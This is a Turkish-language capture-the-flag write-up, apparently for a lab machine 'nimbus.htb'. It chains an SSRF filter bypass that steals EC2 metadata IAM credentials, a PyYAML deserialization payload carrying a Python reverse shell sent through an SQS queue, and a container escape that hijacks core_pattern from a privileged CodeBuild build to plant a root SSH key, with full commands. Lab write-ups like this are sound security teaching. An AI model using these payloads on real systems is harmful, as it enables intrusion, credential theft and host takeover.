@@ -1,0 +1,212 @@
+## Keşif (Reconnaissance)
+
+### Port Taraması
+
+```bash
+nmap -sC -sV -oA full_scan ip
+```
+
+İki açık port tespit ettik:
+- **22/tcp** — OpenSSH
+- **80/tcp** — Nginx (Nimbus v1.4.2 Web App)
+
+### Web Uygulaması
+
+`/etc/hosts` dosyasına `nimbus.htb` eklendikten sonra web uygulamasına göz attık. Karşımıza "Nimbus Internal Job Scheduler" adlı bir iş zamanlayıcı portalı çıktı.
+
+Ana sayfadaki ipuçları:
+- **Job Submitter:** YAML dosyasının URL'sini kabul ediyor veya doğrudan YAML içeriği yapıştırılabiliyordu.
+- **Git entegrasyonu:** Dahili bir Git servisine YAML dosyası yükleyip URL vermeyi destekliyordu.
+- **SSH notu:** "SSH anahtarınızın DevOps lideri marcus tarafından onaylanması gerekiyor."
+
+### Subdomain Tespiti
+
+`ffuf` ile vhost taraması yapıldığında `aws.nimbus.htb` subdomaini bulundu. Ancak bu alan dışarıdan **403 Forbidden** döndürüyordu; sadece iç ağdan erişilebilirdi.
+
+---
+
+## İlk Erişim (Initial Foothold)
+
+### SSRF ile AWS Kimlik Bilgisi Çalma
+
+Job Submitter, uzak URL'den YAML dosyası çekiyordu. URL doğrulamasını atlatmak için iki teknik kullandık:
+
+1. `169.254.169.254` (EC2 metadata IP) adresini **decimal formatına** çevirdik: `2852039166`
+2. URL sonuna `?x=job.yaml` ekleyerek sistemi bu isteğin YAML dosyası olduğuna inandırdık.
+
+```bash
+curl -s -X POST http://nimbus.htb/jobs/preview \
+  -d "url=http://2852039166/latest/meta-data/iam/security-credentials/nimbus-web-role?x=job.yaml" \
+  | sed 's/&#34;/"/g' | grep -oP '"(AccessKeyId|SecretAccessKey|Token)": "\K[^"]+'
+```
+
+Bu istek `nimbus-web-role` IAM rolünün geçici kimlik bilgilerini döndürdü.
+
+### YAML Deserialization ile RCE
+
+Çaldığımız kimlik bilgileriyle AWS ortamını incelemeye başladık. LocalStack üzerinde çalışan SQS kuyruğu (`nimbus-jobs`) bulundu. Worker servisi bu kuyruktan mesajları okuyup PyYAML'ın güvensiz `yaml.load()` fonksiyonuyla işliyordu.
+
+Kali'de dinleyici açtık:
+```bash
+nc -lnvp 4433
+```
+
+Kötü niyetli YAML payload'ını doğrudan SQS kuyruğuna gönderdik:
+
+```bash
+export AWS_ACCESS_KEY_ID="ASIAQX4PG7L2K9M3N5R8"
+export AWS_SECRET_ACCESS_KEY="bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs"
+export AWS_SESSION_TOKEN="<token>"
+export AWS_DEFAULT_REGION="us-east-1"
+
+aws --endpoint-url http://aws.nimbus.htb sqs send-message \
+  --queue-url "http://floci:4566/847219365028/nimbus-jobs" \
+  --message-body '!!python/object/apply:subprocess.Popen [["python3","-c","import socket,subprocess,os;s=socket.socket();s.connect((\"tun0\",4433));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"]]'
+```
+
+Worker servisi kötü niyetli mesajı işleyince container içinde `worker` kullanıcısı (uid=1000) olarak reverse shell aldık.
+
+```
+worker@f4f479a1a27d:/app$
+```
+
+**User Flag:** `/home/worker/user.txt` okundu.
+*
+---
+
+## Yetki Yükseltme (Privilege Escalation)
+
+### Container İçi Keşif
+
+Bulunduğumuz ortamın Docker container'ı olduğunu container ID hostname'inden anladık. `/etc/hosts` dosyası incelendiğinde:
+
+- Container IP: `172.18.0.3`
+- Host (Docker bridge): `172.18.0.1` → `aws.nimbus.htb` ve `nimbus.htb`
+
+### EC2 Metadata ile Farklı IAM Rolü
+
+EC2 metadata servisine container içinden erişilebildiğini fark ettik:
+
+```bash
+curl -s http://ip/latest/meta-data/iam/security-credentials/
+# Çıktı: nimbus-web-role
+```
+
+```bash
+curl -s http://ip/latest/meta-data/iam/security-credentials/nimbus-web-role
+```
+
+`nimbus-web-role` için farklı kimlik bilgileri elde ettik.
+
+### LocalStack Admin Erişimi
+
+LocalStack'in `floci:4566` adresinde çalıştığını keşfettik. `test/test` kimlik bilgileriyle admin yetkisine sahip olunabildiğini fark ettik (LocalStack community edition varsayılan davranışı):
+
+```bash
+AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test \
+  aws s3 ls --endpoint-url http://floci:4566 --region us-east-1
+```
+
+Çıktı: `nimbus-dev-artifacts` adlı bir S3 bucket'ı bulundu. Bucket içinde `source/worker.py` dosyası mevcuttu ve bucket'a yazma yetkimiz vardı.
+
+### CodeBuild ile Privileged Container
+
+LocalStack üzerinde CodeBuild servisi aktifti. Kritik nokta: `floci/floci:latest` image'ı ile `privilegedMode: true` seçeneği kullanıldığında build container'ı host üzerinde `CAP_SYS_ADMIN` yetkisiyle çalışıyordu.
+
+**Buildspec hazırlandı ve S3'e yüklendi:**
+
+```python
+buildspec = """version: 0.2
+phases:
+  build:
+    commands:
+      - UDIR=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
+      - printf '#!/bin/sh\nmkdir -p /root/.ssh\necho "SSH_PUBLIC_KEY" >> /root/.ssh/authorized_keys\nchmod 700 /root/.ssh\nchmod 600 /root/.ssh/authorized_keys\n' > /exploit_root.sh
+      - chmod +x /exploit_root.sh
+      - echo "|${UDIR}/exploit_root.sh" > /proc/sys/kernel/core_pattern
+      - ulimit -c unlimited
+      - bash -c 'kill -11 $$'
+"""
+```
+
+**CodeBuild projesi oluşturuldu:**
+
+```bash
+AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test \
+  aws codebuild create-project \
+    --name pwn-build2 \
+    --source '{"type":"S3","location":"nimbus-dev-artifacts/buildspec2.zip"}' \
+    --artifacts '{"type":"NO_ARTIFACTS"}' \
+    --environment '{"type":"LINUX_CONTAINER","image":"floci/floci:latest","computeType":"BUILD_GENERAL1_SMALL","privilegedMode":true,"environmentVariables":[{"name":"BASH_FUNC_id%%","value":"() { echo uid=1000; }","type":"PLAINTEXT"}]}' \
+    --service-role "arn:aws:iam::847219365028:role/codebuild-role" \
+    --endpoint-url http://floci:4566 --region us-east-1
+```
+
+**Build başlatıldı:**
+
+```bash
+AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test \
+  aws codebuild start-build \
+    --project-name pwn-build2 \
+    --endpoint-url http://floci:4566 --region us-east-1
+```
+
+### Kaçış Mekanizması: Overlay Upperdir + core_pattern
+
+Teknik detaylar:
+
+1. **Overlay Upperdir:** Her Docker container'ının overlay filesystem'inde bir `upperdir` dizini bulunur. Container içinde `/tmp/exploit.sh` adresine yazılan dosya, host üzerinde `<upperdir>/tmp/exploit.sh` olarak görünür. Bu sayede host filesystem'ine doğrudan erişmeden dosya yerleştirilebildi.
+
+2. **core_pattern Hijack:** Privileged container içinden `/proc/sys/kernel/core_pattern` kernel parametresi **global** olarak değiştirilebildi. Bu parametre herhangi bir process crash ettiğinde hangi programın çalıştırılacağını belirler ve root yetkileriyle host üzerinde çalışır.
+
+3. **Tetikleme:** `kill -11 $$` komutu ile build container'ında kasıtlı olarak SIGSEGV sinyali gönderildi. Bu crash, kernel'in `core_pattern`'de belirtilen scripti host root yetkileriyle çalıştırmasını sağladı.
+
+### Root Shell
+
+Script, SSH public key'imizi `/root/.ssh/authorized_keys` dosyasına ekledi:
+
+```bash
+ssh -i htb_key root@10.129.61.221
+```
+
+```
+root@floci:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@floci:~# cat /root/root.txt
+*
+```
+
+---
+
+## Saldırı Zinciri Özeti
+
+```
+SSRF (IP decimal bypass + .yaml suffix trick)
+         ↓
+  EC2 Metadata → nimbus-web-role credentials
+         ↓
+  SQS ← YAML deserialization payload (!!python/object/apply)
+         ↓
+  Worker container shell (uid=1000)
+         ↓
+  EC2 metadata (içeriden) → başka IAM kimlik bilgileri
+         ↓
+  LocalStack test/test → admin erişimi → S3 bucket
+         ↓
+  CodeBuild (floci/floci:latest, privilegedMode=true)
+         ↓
+  overlay upperdir + /proc/sys/kernel/core_pattern hijack
+         ↓
+  kill -11 → kernel çalıştırır → HOST ROOT
+```
+
+---
+
+## çıkarılan Dersler
+
+- **SSRF filter bypass:** IP'yi decimal, hex veya diğer formatlara çevirerek yaygın blacklist'leri atlatmak mümkündür.
+- **YAML güvenliği:** `yaml.load()` güvensizdir; her zaman `yaml.safe_load()` veya `Loader=yaml.SafeLoader` kullanılmalıdır.
+- **Privileged container tehlikesi:** `--privileged` modu container'a `CAP_SYS_ADMIN` yetkisi verir ve kernel parametrelerini değiştirmeye izin verir. Bu ciddi bir güvenlik riskidir.
+- **LocalStack varsayılan yapılandırması:** `test/test` kimlik bilgileri tüm kaynaklara admin erişimi sağlar; production'da IAM kesinlikle konfigüre edilmelidir.
+- **core_pattern:** Kernel seviyesinde global bir parametre olduğundan container namespace izolasyonunu deler.
+
